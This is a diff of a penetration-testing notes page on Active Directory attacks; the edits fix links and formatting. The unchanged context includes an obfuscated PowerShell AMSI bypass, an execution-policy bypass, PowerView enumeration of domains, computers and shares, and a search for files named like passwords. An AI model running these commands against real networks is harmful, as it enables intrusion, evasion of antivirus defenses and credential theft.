@@ -30,7 +30,7 @@ nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>
 
 **Assuming that you are conected to the internal network (part of the domain) but dont have access to any system in the domain.**
 
-#### **check out**[ **MITM**](https://7h3w4lk3r.gitbook.io/the-hive/network-attacks/active-directory-attacks/network-poisoning-mitm) **Section.**
+#### **check out** [**MITM**](network-poisoning-mitm/) **Section.**
 
 ## Bypass AMSI
 
@@ -42,7 +42,7 @@ powershell -ep bypass
 SET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 ```
 
-#### For more info about AMSI refere to the AMSI bypass in AV Evasion.
+#### For more info about AMSI refer to the [AMSI bypass](../../defense-evasion/av-evasion/amsi-bypass.md) in AV Evasion.
 
 ## Load scripts in Memory
 
@@ -248,8 +248,6 @@ Get-NetForestTrust
 Get-NetDomainTrust -Forest <ForestName>
 ```
 
-****
-
 ## Domain Computers
 
 ```
@@ -259,8 +257,6 @@ Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object 
 
 #Enumerate Live machines 
 Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
-
-
 ```
 
 #### Get All Computers by Name
@@ -318,8 +314,6 @@ Get-Content -Path C:ComputerList.txt | Remove-ADComputer
 ```
 Get-ADComputer -SearchBase "OU=DN" -Filter * | Remote-ADComputer
 ```
-
-
 
 ## Users & Groups
 
@@ -717,18 +711,3 @@ Find-DomainShare -CheckShareAccess
 Find-InterestingDomainShareFile -Include *passwords*
 
 ```
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
